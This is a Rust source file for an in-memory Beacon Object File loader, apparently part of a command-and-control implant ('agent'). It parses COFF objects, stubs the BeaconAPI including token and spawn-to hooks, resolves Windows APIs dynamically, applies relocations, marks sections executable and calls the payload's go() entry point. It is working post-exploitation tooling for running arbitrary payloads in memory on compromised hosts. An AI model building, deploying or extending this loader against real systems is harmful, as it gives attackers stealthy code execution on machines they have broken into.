// COFF BOF Loader — in-process Beacon Object File execution
// Parses COFF, resolves symbols against BeaconAPI, processes relocations, calls go()

#[cfg(target_os = "windows")]
use std::ffi::{c_void, CStr};
#[cfg(target_os = "windows")]
use std::sync::Mutex;
#[cfg(target_os = "windows")]
use once_cell::sync::Lazy;

// ============================================================================
// COFF structures (PE/COFF spec)
// ============================================================================

#[cfg(target_os = "windows")]
#[repr(C, packed)]
#[derive(Copy, Clone)]
struct CoffHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
#[derive(Copy, Clone)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
#[derive(Copy, Clone)]
struct CoffRelocation {
    virtual_address: u32,
    symbol_table_index: u32,
    reloc_type: u16,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
#[derive(Copy, Clone)]
struct CoffSymbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    type_field: u16,
    storage_class: u8,
    number_of_aux_symbols: u8,
}

// COFF constants
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_ADDR64: u16 = 1;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32: u16 = 4;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32_1: u16 = 5;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32_2: u16 = 6;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32_3: u16 = 7;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32_4: u16 = 8;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32_5: u16 = 9;

// ============================================================================
// BeaconAPI output capture
// ============================================================================

#[cfg(target_os = "windows")]
static BEACON_OUTPUT: Lazy<Mutex<Vec<u8>>> = Lazy::new(|| Mutex::new(Vec::new()));

#[cfg(target_os = "windows")]
#[repr(C)]
struct DataParser {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct FormatBuffer {
    original: *mut u8,
    buffer: *mut u8,
    length: i32,
    size: i32,
}

// ============================================================================
// BeaconAPI stubs
// ============================================================================

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_printf(_type: i32, fmt: *const u8) {
    if fmt.is_null() { return; }
    let s = CStr::from_ptr(fmt as *const i8).to_string_lossy();
    let mut out = BEACON_OUTPUT.lock().unwrap();
    out.extend_from_slice(s.as_bytes());
    out.push(b'\n');
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_output(_type: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 { return; }
    let slice = std::slice::from_raw_parts(data, len as usize);
    BEACON_OUTPUT.lock().unwrap().extend_from_slice(slice);
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_data_parse(parser: *mut DataParser, buffer: *mut u8, size: i32) {
    if parser.is_null() { return; }
    (*parser).original = buffer;
    (*parser).buffer = buffer;
    (*parser).length = size;
    (*parser).size = size;
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_data_int(parser: *mut DataParser) -> i32 {
    if parser.is_null() || (*parser).length < 4 { return 0; }
    let val = *((*parser).buffer as *const i32);
    (*parser).buffer = (*parser).buffer.add(4);
    (*parser).length -= 4;
    val
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_data_short(parser: *mut DataParser) -> i16 {
    if parser.is_null() || (*parser).length < 2 { return 0; }
    let val = *((*parser).buffer as *const i16);
    (*parser).buffer = (*parser).buffer.add(2);
    (*parser).length -= 2;
    val
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_data_length(parser: *mut DataParser) -> i32 {
    if parser.is_null() || (*parser).length < 4 { return 0; }
    let len = *((*parser).buffer as *const i32);
    (*parser).buffer = (*parser).buffer.add(4);
    (*parser).length -= 4;
    len
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_data_extract(parser: *mut DataParser, size: *mut i32) -> *mut u8 {
    if parser.is_null() || size.is_null() { return std::ptr::null_mut(); }
    let len = beacon_data_length(parser);
    if len <= 0 || len > (*parser).length { return std::ptr::null_mut(); }
    let ptr = (*parser).buffer;
    (*parser).buffer = (*parser).buffer.add(len as usize);
    (*parser).length -= len;
    *size = len;
    ptr
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_alloc(buffer: *mut *mut FormatBuffer, max_size: i32) {
    if buffer.is_null() { return; }
    let layout = std::alloc::Layout::from_size_align_unchecked(std::mem::size_of::<FormatBuffer>(), 8);
    let ptr = std::alloc::alloc_zeroed(layout) as *mut FormatBuffer;
    if ptr.is_null() { return; }
    let data = std::alloc::alloc_zeroed(std::alloc::Layout::from_size_align_unchecked(max_size as usize, 1));
    (*ptr).original = data;
    (*ptr).buffer = data;
    (*ptr).length = 0;
    (*ptr).size = max_size;
    *buffer = ptr;
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_reset(buffer: *mut FormatBuffer) {
    if buffer.is_null() { return; }
    (*buffer).buffer = (*buffer).original;
    (*buffer).length = 0;
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_free(buffer: *mut FormatBuffer) {
    if buffer.is_null() { return; }
    if !(*buffer).original.is_null() {
        std::alloc::dealloc((*buffer).original, std::alloc::Layout::from_size_align_unchecked((*buffer).size as usize, 1));
    }
    let layout = std::alloc::Layout::from_size_align_unchecked(std::mem::size_of::<FormatBuffer>(), 8);
    std::alloc::dealloc(buffer as *mut u8, layout);
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_append(buffer: *mut FormatBuffer, data: *const u8, len: i32) {
    if buffer.is_null() || data.is_null() || len <= 0 { return; }
    if (*buffer).length + len > (*buffer).size { return; }
    std::ptr::copy_nonoverlapping(data, (*buffer).buffer, len as usize);
    (*buffer).buffer = (*buffer).buffer.add(len as usize);
    (*buffer).length += len;
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_printf(buffer: *mut FormatBuffer, fmt: *const u8) {
    if buffer.is_null() || fmt.is_null() { return; }
    let s = CStr::from_ptr(fmt as *const i8).to_string_lossy();
    let bytes = s.as_bytes();
    beacon_format_append(buffer, bytes.as_ptr(), bytes.len() as i32);
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_to_string(buffer: *mut FormatBuffer, size: *mut i32) -> *mut u8 {
    if buffer.is_null() || size.is_null() { return std::ptr::null_mut(); }
    *size = (*buffer).length;
    (*buffer).original
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_format_int(buffer: *mut FormatBuffer, val: i32) {
    if buffer.is_null() { return; }
    if (*buffer).length + 4 > (*buffer).size { return; }
    *((*buffer).buffer as *mut i32) = val;
    (*buffer).buffer = (*buffer).buffer.add(4);
    (*buffer).length += 4;
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn to_wide_char(_src: *const u8, _dst: *mut u16, _max: i32) {
    // Stub: UTF-8 to UTF-16 conversion
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_is_admin() -> i32 {
    // Stub: return 0 (not admin)
    0
}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_use_token(_token: *mut c_void) {}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_revert_token() {}

#[cfg(target_os = "windows")]
unsafe extern "C" fn beacon_get_spawn_to(_x86: i32, _buffer: *mut u8, _len: i32) {}

// ============================================================================
// Symbol resolution table
// ============================================================================

#[cfg(target_os = "windows")]
fn get_beacon_api_table() -> std::collections::HashMap<&'static str, usize> {
    let mut table = std::collections::HashMap::new();
    table.insert("BeaconPrintf", beacon_printf as usize);
    table.insert("BeaconOutput", beacon_output as usize);
    table.insert("BeaconDataParse", beacon_data_parse as usize);
    table.insert("BeaconDataInt", beacon_data_int as usize);
    table.insert("BeaconDataShort", beacon_data_short as usize);
    table.insert("BeaconDataLength", beacon_data_length as usize);
    table.insert("BeaconDataExtract", beacon_data_extract as usize);
    table.insert("BeaconFormatAlloc", beacon_format_alloc as usize);
    table.insert("BeaconFormatReset", beacon_format_reset as usize);
    table.insert("BeaconFormatFree", beacon_format_free as usize);
    table.insert("BeaconFormatAppend", beacon_format_append as usize);
    table.insert("BeaconFormatPrintf", beacon_format_printf as usize);
    table.insert("BeaconFormatToString", beacon_format_to_string as usize);
    table.insert("BeaconFormatInt", beacon_format_int as usize);
    table.insert("toWideChar", to_wide_char as usize);
    table.insert("BeaconIsAdmin", beacon_is_admin as usize);
    table.insert("BeaconUseToken", beacon_use_token as usize);
    table.insert("BeaconRevertToken", beacon_revert_token as usize);
    table.insert("BeaconGetSpawnTo", beacon_get_spawn_to as usize);
    table
}

// ============================================================================
// COFF loader implementation
// ============================================================================

#[cfg(target_os = "windows")]
pub fn run_bof(coff_data: &[u8], args: &[u8]) -> Result<String, String> {
    unsafe { run_bof_impl(coff_data, args) }
}

#[cfg(target_os = "windows")]
unsafe fn run_bof_impl(coff_data: &[u8], args: &[u8]) -> Result<String, String> {
    // Clear output buffer
    BEACON_OUTPUT.lock().unwrap().clear();

    // 1. Parse COFF header
    if coff_data.len() < std::mem::size_of::<CoffHeader>() {
        return Err("COFF data too small".to_string());
    }

    let header = std::ptr::read_unaligned(coff_data.as_ptr() as *const CoffHeader);
    if header.machine != 0x8664 {
        return Err("Only x64 COFF supported".to_string());
    }

    let num_sections = header.number_of_sections as usize;
    let opt_hdr_size = header.size_of_optional_header as usize;
    let section_table_offset = std::mem::size_of::<CoffHeader>() + opt_hdr_size;

    // 2. Read section headers
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let offset = section_table_offset + (i * std::mem::size_of::<SectionHeader>());
        if offset + std::mem::size_of::<SectionHeader>() > coff_data.len() {
            return Err("Invalid section table".to_string());
        }
        let sec = std::ptr::read_unaligned(coff_data.as_ptr().add(offset) as *const SectionHeader);
        sections.push(sec);
    }

    // 3. Parse symbol table and string table
    let sym_table_offset = header.pointer_to_symbol_table as usize;
    let num_symbols = header.number_of_symbols as usize;
    let string_table_offset = sym_table_offset + (num_symbols * 18);

    let mut symbols = Vec::new();
    for i in 0..num_symbols {
        let offset = sym_table_offset + (i * 18);
        if offset + 18 > coff_data.len() {
            return Err("Invalid symbol table".to_string());
        }
        let sym = std::ptr::read_unaligned(coff_data.as_ptr().add(offset) as *const CoffSymbol);
        symbols.push(sym);
    }

    // Helper to get symbol name
    let get_symbol_name = |sym: &CoffSymbol| -> String {
        if sym.name[0] != 0 || sym.name[1] != 0 || sym.name[2] != 0 || sym.name[3] != 0 {
            // Name is inline
            let end = sym.name.iter().position(|&c| c == 0).unwrap_or(8);
            String::from_utf8_lossy(&sym.name[..end]).to_string()
        } else {
            // Name is in string table
            let offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]) as usize;
            let str_offset = string_table_offset + offset;
            if str_offset >= coff_data.len() { return String::new(); }
            let end = coff_data[str_offset..].iter().position(|&c| c == 0).unwrap_or(0);
            String::from_utf8_lossy(&coff_data[str_offset..str_offset+end]).to_string()
        }
    };

    // 4. Allocate memory for sections
    type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
    type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
    type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;

    let virtual_alloc: VirtualAllocFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
            .ok_or("Failed to resolve VirtualAlloc")?
    );
    let virtual_protect: VirtualProtectFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
            .ok_or("Failed to resolve VirtualProtect")?
    );
    let _virtual_free: VirtualFreeFn = std::mem::transmute(
        crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
            .ok_or("Failed to resolve VirtualFree")?
    );

    let mut section_bases: Vec<*mut u8> = Vec::new();
    for sec in &sections {
        let size = sec.size_of_raw_data.max(sec.virtual_size) as usize;
        if size == 0 {
            section_bases.push(std::ptr::null_mut());
            continue;
        }

        let mem = virtual_alloc(std::ptr::null_mut(), size, 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
        if mem.is_null() {
            return Err("VirtualAlloc failed for section".to_string());
        }

        // Copy section data
        if sec.pointer_to_raw_data > 0 && sec.size_of_raw_data > 0 {
            let raw_offset = sec.pointer_to_raw_data as usize;
            let raw_size = sec.size_of_raw_data as usize;
            if raw_offset + raw_size <= coff_data.len() {
                std::ptr::copy_nonoverlapping(
                    coff_data.as_ptr().add(raw_offset),
                    mem as *mut u8,
                    raw_size
                );
            }
        }

        section_bases.push(mem as *mut u8);
    }

    // 5. Resolve symbols
    let beacon_api = get_beacon_api_table();
    let mut resolved_symbols: Vec<usize> = Vec::new();

    let mut i = 0;
    while i < symbols.len() {
        let sym = &symbols[i];
        let skip_aux = sym.number_of_aux_symbols as usize;

        if sym.section_number > 0 {
            // Defined symbol
            let sec_idx = (sym.section_number - 1) as usize;
            if sec_idx < section_bases.len() {
                let base = section_bases[sec_idx] as usize;
                resolved_symbols.push(base + sym.value as usize);
            } else {
                resolved_symbols.push(0);
            }
        } else if sym.section_number == 0 {
            // External symbol
            let mut name = get_symbol_name(sym);

            // Handle __imp_ prefix (import symbol)
            if name.starts_with("__imp_") {
                name = name[6..].to_string();
            }

            if let Some(&addr) = beacon_api.get(name.as_str()) {
                resolved_symbols.push(addr);
            } else {
                // Try to resolve from system DLLs
                let parts: Vec<&str> = name.split("$").collect();
                if parts.len() == 2 {
                    // Format: DllName$FunctionName
                    let dll_name = format!("{}.dll", parts[0]);
                    if let Some(addr) = crate::winapi_resolve::resolve(&dll_name, parts[1]) {
                        resolved_symbols.push(addr as usize);
                    } else {
                        resolved_symbols.push(0);
                    }
                } else {
                    // Try common DLLs
                    let mut found = false;
                    for dll in &["kernel32.dll", "ntdll.dll", "advapi32.dll", "user32.dll", "msvcrt.dll"] {
                        if let Some(addr) = crate::winapi_resolve::resolve(dll, &name) {
                            resolved_symbols.push(addr as usize);
                            found = true;
                            break;
                        }
                    }
                    if !found {
                        resolved_symbols.push(0);
                    }
                }
            }
        } else {
            // Absolute or other
            resolved_symbols.push(sym.value as usize);
        }

        // Skip aux symbols (add placeholders)
        for _ in 0..skip_aux {
            resolved_symbols.push(0);
        }

        // Move to next non-aux symbol
        i += 1 + skip_aux;
    }

    // 6. Process relocations
    for (sec_idx, sec) in sections.iter().enumerate() {
        if sec.number_of_relocations == 0 { continue; }

        let reloc_offset = sec.pointer_to_relocations as usize;
        let num_relocs = sec.number_of_relocations as usize;
        let section_base = section_bases[sec_idx] as usize;

        for i in 0..num_relocs {
            let offset = reloc_offset + (i * std::mem::size_of::<CoffRelocation>());
            if offset + std::mem::size_of::<CoffRelocation>() > coff_data.len() {
                continue;
            }

            let reloc = std::ptr::read_unaligned(coff_data.as_ptr().add(offset) as *const CoffRelocation);
            let target_address = section_base + reloc.virtual_address as usize;
            let symbol_idx = reloc.symbol_table_index as usize;

            if symbol_idx >= resolved_symbols.len() {
                continue;
            }

            let symbol_address = resolved_symbols[symbol_idx];
            if symbol_address == 0 {
                continue; // Unresolved external
            }

            match reloc.reloc_type {
                IMAGE_REL_AMD64_ADDR64 => {
                    // 64-bit absolute address
                    let ptr = target_address as *mut u64;
                    *ptr = (*ptr).wrapping_add(symbol_address as u64);
                }
                IMAGE_REL_AMD64_ADDR32NB => {
                    // 32-bit address without image base
                    let ptr = target_address as *mut u32;
                    *ptr = (*ptr).wrapping_add(symbol_address as u32);
                }
                IMAGE_REL_AMD64_REL32 => {
                    // 32-bit PC-relative
                    let delta = (symbol_address as i64) - (target_address as i64 + 4);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                IMAGE_REL_AMD64_REL32_1 => {
                    let delta = (symbol_address as i64) - (target_address as i64 + 5);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                IMAGE_REL_AMD64_REL32_2 => {
                    let delta = (symbol_address as i64) - (target_address as i64 + 6);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                IMAGE_REL_AMD64_REL32_3 => {
                    let delta = (symbol_address as i64) - (target_address as i64 + 7);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                IMAGE_REL_AMD64_REL32_4 => {
                    let delta = (symbol_address as i64) - (target_address as i64 + 8);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                IMAGE_REL_AMD64_REL32_5 => {
                    let delta = (symbol_address as i64) - (target_address as i64 + 9);
                    let ptr = target_address as *mut i32;
                    *ptr = (*ptr).wrapping_add(delta as i32);
                }
                _ => {}
            }
        }
    }

    // 7. Set executable permissions on code sections
    for (sec_idx, sec) in sections.iter().enumerate() {
        let characteristics = sec.characteristics;
        // Check if section is executable (IMAGE_SCN_MEM_EXECUTE = 0x20000000)
        if (characteristics & 0x20000000) != 0 {
            let base = section_bases[sec_idx];
            if !base.is_null() {
                let size = sec.size_of_raw_data.max(sec.virtual_size) as usize;
                let mut old_protect: u32 = 0;
                virtual_protect(base as *mut c_void, size, 0x20, &mut old_protect); // PAGE_EXECUTE_READ
            }
        }
    }

    // 8. Find and call go()
    let mut go_address: Option<usize> = None;
    let mut i = 0;
    while i < symbols.len() {
        let sym = &symbols[i];
        let name = get_symbol_name(sym);
        if name == "go" && sym.section_number > 0 {
            go_address = Some(resolved_symbols[i]);
            break;
        }
        // Skip aux symbols
        i += 1 + sym.number_of_aux_symbols as usize;
    }

    let go_addr = go_address.ok_or("Could not find 'go' symbol in BOF")?;

    // Call go(args, args_len)
    type GoFn = unsafe extern "C" fn(*const u8, i32);
    let go_fn: GoFn = std::mem::transmute(go_addr);
    go_fn(args.as_ptr(), args.len() as i32);

    // 9. Get captured output
    let output = BEACON_OUTPUT.lock().unwrap().clone();
    let output_str = String::from_utf8_lossy(&output).to_string();

    // Note: We intentionally leak the allocated sections since BOFs may have
    // registered callbacks or have other dependencies. In a production system,
    // you'd want to track allocations and free them when the agent exits.

    Ok(if output_str.is_empty() {
        "BOF executed (no output)".to_string()
    } else {
        output_str
    })
}

#[cfg(not(target_os = "windows"))]
pub fn run_bof(_coff_data: &[u8], _args: &[u8]) -> Result<String, String> {
    Err("BOF execution requires Windows".to_string())
}
